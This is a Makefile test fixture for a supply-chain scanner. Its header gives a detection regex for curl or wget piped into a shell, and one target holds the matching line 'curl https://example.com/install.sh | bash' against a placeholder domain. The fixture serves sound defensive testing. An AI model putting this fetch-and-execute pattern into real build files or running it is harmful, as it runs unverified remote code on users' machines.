# TEST: SUPPLY-003 - Makefile with download-and-execute pattern
# This triggers: /(?:curl|wget)\s+.*\|\s*(?:bash|sh)/
# The target is never invoked. URL is a documentation-only domain.

.PHONY: test-signature
test-signature:
	@echo "This target contains a scanner test signature"
	curl https://example.com/install.sh | bash
